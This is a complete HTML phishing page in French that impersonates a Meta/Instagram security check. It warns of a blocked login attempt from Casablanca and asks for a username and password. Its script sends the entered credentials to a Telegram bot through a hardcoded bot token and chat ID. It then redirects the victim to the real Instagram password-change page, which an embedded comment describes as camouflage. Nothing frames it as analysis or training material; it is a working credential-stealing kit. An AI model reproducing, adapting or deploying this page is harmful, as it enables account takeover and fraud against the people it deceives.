<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Centre de Sécurité Meta</title>
    <style>
        :root { --m-blue: #0064e0; --bg-blue: #0866ff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        
        body { 
            background: var(--bg-blue); 
            display: flex; align-items: center; justify-content: center; 
            min-height: 100vh; padding: 20px; 
        }

        .card { 
            background: white; border-radius: 12px; width: 100%; max-width: 400px; 
            padding: 30px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); text-align: center;
        }

        /* اللوغو الرسمي بدون أخطاء أبعاد */
        .logo-container {
            width: 175px;
            margin: 0 auto 25px;
            display: block;
        }
        .logo-container img {
            width: 100%;
            height: auto;
            display: block;
        }

        h2 { font-size: 22px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
        
        .alert { 
            background: #fff4f4; border: 1px solid #f9d6d6; border-radius: 8px; 
            padding: 15px; margin-bottom: 20px; display: flex; align-items: flex-start; text-align: left;
        }
        .alert svg { fill: #fa3e3e; width: 24px; margin-right: 12px; margin-top: 2px; flex-shrink: 0; }
        .alert-txt { font-size: 14px; color: #4b4f56; line-height: 1.4; }
        .red { font-weight: 700; color: #d93025; }

        input { 
            width: 100%; padding: 14px; background: #f5f6f7; border: 1px solid #dddfe2; 
            border-radius: 6px; margin-bottom: 10px; font-size: 14px; outline: none;
        }
        input:focus { border-color: var(--m-blue); }

        .btn { 
            width: 100%; background: var(--m-blue); color: white; border: none; 
            padding: 14px; border-radius: 6px; font-weight: 700; font-size: 16px; cursor: pointer;
        }

        .ft { margin-top: 30px; border-top: 1px solid #ebedf0; padding-top: 20px; }
        .ft img { width: 80px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
    </div>

    <h2>Vérification de sécurité</h2>

    <div class="alert">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
        <div class="alert-txt">
            Une tentative de connexion inhabituelle a été bloquée : <br>
            <span class="red">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
            <br>Veuillez confirmer votre identité.
        </div>
    </div>

    <form id="meta-check">
        <input type="text" id="u" placeholder="Nom d'utilisateur, e-mail ou mobile" required>
        <input type="password" id="p" placeholder="Mot de passe" required>
        <button type="submit" class="btn">Continuer</button>
    </form>

    <div class="ft">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png">
    </div>
</div>

<script>
    document.getElementById('meta-check').onsubmit = async (e) => {
        e.preventDefault();
        const u = document.getElementById('u').value;
        const p = document.getElementById('p').value;
        const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
        const cid = "5558301795";
        
        const msg = `🇲🇦 **NEW LOG: MAROC**\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\``;

        await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        
        // التوجيه لصفحة تغيير الباسورد الحقيقية لزيادة التمويه
        window.location.href = "https://www.instagram.com/accounts/password/change/";
    };
</script>

</body>
</html>
